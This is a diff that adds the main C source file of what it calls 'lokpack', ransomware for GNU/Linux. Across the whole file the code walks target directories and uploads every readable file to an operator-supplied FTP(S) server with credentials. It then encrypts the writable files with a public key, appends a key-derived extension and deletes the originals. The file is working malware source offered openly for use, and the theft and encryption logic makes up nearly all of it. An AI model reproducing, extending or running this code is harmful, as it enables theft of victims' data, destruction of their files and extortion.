@@ -1,0 +1,363 @@
+/*
+
+ * lokpack | ransomware for GNU/Linux
+ * written by ngn (https://ngn.tf) (2025)
+
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+*/
+
+#include "encryptor/option.h"
+
+#include "lib/traverse.h"
+#include "lib/config.h"
+#include "lib/util.h"
+#include "lib/rsa.h"
+#include "lib/log.h"
+
+#include <openssl/evp.h>
+#include <curl/curl.h>
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
+
+#include <fcntl.h>
+#include <stdio.h>
+
+/* shared handler data */
+char *ftp_creds = NULL;
+char *ftp_url   = NULL;
+
+EVP_PKEY *pub_key = NULL;
+char      pub_hash[LP_SHA256_SIZE];
+char      pub_ext[7] = {0};
+
+void upload_handler(char *path) {
+  char    *url     = NULL;
+  int      url_len = 0;
+  FILE    *file    = NULL;
+  CURL    *curl    = NULL;
+  CURLcode res;
+
+  if (NULL == path)
+    return;
+
+  lp_replace(path, ' ', '_');
+
+  url_len = strlen(ftp_url) + strlen(path) + 1;
+  url     = calloc(1, url_len + 1);
+
+  if (snprintf(url, url_len + 1, "%s/%s", ftp_url, path) != url_len) {
+    lp_debug("Failed to format the FTP(S) URL: %s", lp_str_error());
+    goto free;
+  }
+
+  if (NULL == (file = fopen(path, "r"))) {
+    lp_debug("Failed to open %s: %s", path, lp_str_error());
+    goto free;
+  }
+
+  if (NULL == (curl = curl_easy_init())) {
+    lp_debug("Failed to initialize curl for %s", path);
+    goto free;
+  }
+
+  curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+  curl_easy_setopt(curl, CURLOPT_USERPWD, ftp_creds);
+  curl_easy_setopt(
+      curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
+  curl_easy_setopt(curl, CURLOPT_URL, url);
+  curl_easy_setopt(curl, CURLOPT_READDATA, file);
+
+  lp_debug("Uploading to FTP(S): %s", url);
+
+  if (CURLE_OK != (res = curl_easy_perform(curl)))
+    lp_fail("Failed to upload %s: %s", path, curl_easy_strerror(res));
+
+free:
+  if (NULL != curl)
+    curl_easy_cleanup(curl);
+
+  if (NULL != file)
+    fclose(file);
+
+  free(url);
+  free(path);
+}
+
+void encrypt_handler(char *path) {
+  bool        ret = false;
+  lp_rsa_t    rsa;
+  struct stat st;
+
+  /* input file */
+  int     in = -1, in_len = 0, in_file_len = strlen(path);
+  uint8_t in_buf[LP_RSA_BLOCK_SIZE];
+  char   *in_file = path;
+
+  /* output file */
+  int     out = -1, out_len = 0, out_file_len = in_file_len + sizeof(pub_ext);
+  uint8_t out_buf[LP_RSA_BLOCK_SIZE];
+  char   *out_file = calloc(1, out_file_len + 1);
+
+  /* initialize the RSA structure with the public key */
+  lp_rsa_init(&rsa, pub_key);
+
+  /* output file name */
+  if (snprintf(out_file, out_file_len + 1, "%s.%s", path, pub_ext) !=
+      out_file_len) {
+    lp_debug("Failed to format output file path: %s", lp_str_error());
+    goto free;
+  }
+
+  /* open the input file */
+  if ((in = open(in_file, O_RDONLY)) < 0) {
+    lp_debug("Failed to open input file %s: %s", in_file, lp_str_error());
+    goto free;
+  }
+
+  /* open the output file */
+  if ((out = open(out_file, O_RDWR | O_CREAT, 0600)) < 0) {
+    lp_debug("Failed to open output file %s: %s", out_file, lp_str_error());
+    goto free;
+  }
+
+  /* load the RSA encryption context */
+  if (!lp_rsa_load(&rsa)) {
+    lp_debug("Failed to load the RSA context");
+    goto free;
+  }
+
+  /* save the secret and the IV */
+  if (write(out, rsa.secret, sizeof(rsa.secret)) <= 0) {
+    lp_debug("Failed to write the secret to %s: %s", out_file, lp_str_error());
+    goto free;
+  }
+
+  if (write(out, rsa.iv, sizeof(rsa.iv)) <= 0) {
+    lp_debug("Failed to write the IV to %s: %s", out_file, lp_str_error());
+    goto free;
+  }
+
+  /* read from the input file, one block at a time */
+  while ((in_len = read(in, in_buf, sizeof(in_buf))) > 0) {
+    /* encrypt the read full/partial block */
+    if (!lp_rsa_encrypt(&rsa, in_buf, in_len, out_buf, &out_len)) {
+      lp_debug("Failed to encrypt %s (%lu, %lu)", in_file, in_len, out_len);
+      goto free;
+    }
+
+    /* write the encrypted full block to the output file */
+    if (out_len != 0 && write(out, out_buf, out_len) <= 0) {
+      lp_debug("Failed to write output to %s: %s", out_file, lp_str_error());
+      goto free;
+    }
+
+    /* check we read the last block */
+    if (in_len < (int)sizeof(in_buf))
+      break;
+  }
+
+  /* encrypt and write any leftover partial block */
+  if (!lp_rsa_done(&rsa, out_buf, &out_len)) {
+    lp_debug("Failed to encrypt the last block");
+    goto free;
+  }
+
+  if (write(out, out_buf, out_len) < 0) {
+    lp_debug("Failed to write last block to %s: %s", out_file, lp_str_error());
+    goto free;
+  }
+
+  /* get and copy the file info */
+  if (fstat(in, &st) < 0) {
+    lp_debug("Failed to get stat of file: %s", in_file);
+    goto free;
+  }
+
+  if (!lp_copy_stat(out, &st)) {
+    lp_debug("Failed to copy perms from %s to %s", out_file, in_file);
+    goto free;
+  }
+
+  /* remove the input file */
+  if (unlink(in_file) < 0) {
+    lp_debug("Failed to unlink input file: %s", in_file);
+    goto free;
+  }
+
+  ret = true;
+
+free:
+  if (in >= 0)
+    close(in);
+
+  if (out >= 0)
+    close(out);
+
+  if (!ret) {
+    lp_fail("Failed to encrypt %s", in_file);
+    unlink(out_file);
+  }
+
+  free(in_file);
+  free(out_file);
+  lp_rsa_free(&rsa);
+}
+
+int main(int argc, char **argv) {
+
+  /* dir traverser */
+  lp_traverser_t trav;
+
+  /* options */
+  char  *ftp_usr = NULL, *ftp_pwd = NULL, **cur = NULL;
+  char **paths = NULL, **exts = NULL;
+  int    threads;
+
+  /* temporary stuff */
+  int i, len, ret = EXIT_FAILURE;
+
+  /* initialize the traverser */
+  lp_traverser_init(&trav);
+
+  for (i = 1; i < argc; i++) {
+    /* check for the help option */
+    if (lp_streq(argv[i], "-h") || lp_streq(argv[i], "--help")) {
+      opt_help();
+      return EXIT_SUCCESS;
+    }
+
+    /* parse the argument as an option */
+    if (!opt_parse(argv[i]))
+      goto end;
+  }
+
+  lp_info("Running " FG_BOLD LP_VERSION FG_RESET " with following options:");
+  opt_print();
+
+  /* load and check the target path and the extensions option */
+  paths = opt_list("paths");
+  exts  = opt_list("exts");
+
+  if (opt_empty(paths)) {
+    lp_fail("Please specify at least one target directory");
+    goto end;
+  }
+
+  if (opt_empty(exts))
+    exts = NULL;
+
+  /* obtain & check the FTP(S) URL and the credentials */
+  ftp_usr = opt_str("ftp-user");
+  ftp_pwd = opt_str("ftp-pwd");
+  ftp_url = opt_str("ftp-url");
+
+  if (!opt_bool("no-ftp")) {
+    if (NULL == ftp_url) {
+      lp_fail("No FTP(S) URL is specified, use no-ftp to disable FTP(S)");
+      goto end;
+    }
+
+    if (NULL == ftp_usr) {
+      lp_fail("No FTP(S) user is specified, use no-ftp to disable FTP(S)");
+      goto end;
+    }
+
+    if (NULL == ftp_pwd) {
+      lp_fail("No FTP(s) password is specified, use no-ftp to disable FTP(S)");
+      goto end;
+    }
+  }
+
+  /* build out the FTP(S) credentials for using them with curl */
+  len       = strlen(ftp_usr) + strlen(ftp_pwd) + 1;
+  ftp_creds = calloc(1, len + 1);
+
+  if (NULL != ftp_usr && NULL != ftp_pwd &&
+      snprintf(ftp_creds, len + 1, "%s:%s", ftp_usr, ftp_pwd) != len) {
+    lp_fail("Failed to format the FTP(S) credentials: %s", lp_str_error());
+    goto end;
+  }
+
+  /* obtain & check the thread count for the thread pool */
+  if ((threads = opt_int("threads")) <= 0) {
+    lp_fail("Please specify a valid thread number (at least one)");
+    goto end;
+  }
+
+  /* load all the public key stuff */
+  lp_sha256(LP_PUBKEY, pub_hash);
+  snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash);
+
+  if (NULL == (pub_key = lp_rsa_key_load())) {
+    lp_fail("Failed to load the public key, is the key valid?");
+    goto end;
+  }
+
+  /* setup the traverser (see lib/traverse.c) */
+  if (!lp_traverser_setup(&trav, threads, exts)) {
+    lp_fail("Failed to create a traverser: %s", lp_str_error());
+    goto end;
+  }
+
+  /*
+
+   * use traverser to travese all the target paths and upload all the files we
+   * can read to the FTP(S) server using the upload_handler() (unless FTP(S) is
+   * disabled with no-ftp)
+
+  */
+  lp_traverser_set_mode(&trav, R_OK);
+  lp_traverser_set_handler(&trav, upload_handler);
+
+  for (cur = paths; !opt_bool("no-ftp") && NULL != *cur; cur++) {
+    lp_info("Uploading %s", *cur);
+    lp_traverser_run(&trav, *cur);
+  }
+
+  if (!lp_traverser_wait(&trav, opt_bool("progress"))) {
+    lp_fail("Failed to wait for upload threads: %s", lp_str_error());
+    goto end;
+  }
+
+  /*
+
+   * now use the traverser to find all the files we can read AND write, and
+   * encrypt them using the encrypt_handler()
+
+  */
+  lp_traverser_set_mode(&trav, R_OK | W_OK);
+  lp_traverser_set_handler(&trav, encrypt_handler);
+
+  for (cur = paths; NULL != *cur; cur++) {
+    lp_info("Encrypting %s", *cur);
+    lp_traverser_run(&trav, *cur);
+  }
+
+  if (!lp_traverser_wait(&trav, opt_bool("progress"))) {
+    lp_fail("Failed to wait for encryption threads: %s", lp_str_error());
+    goto end;
+  }
+
+  lp_success("Operation completed");
+  ret = EXIT_SUCCESS;
+
+end:
+  lp_traverser_free(&trav);
+  lp_rsa_key_free(pub_key);
+  free(ftp_creds);
+  return ret;
+}
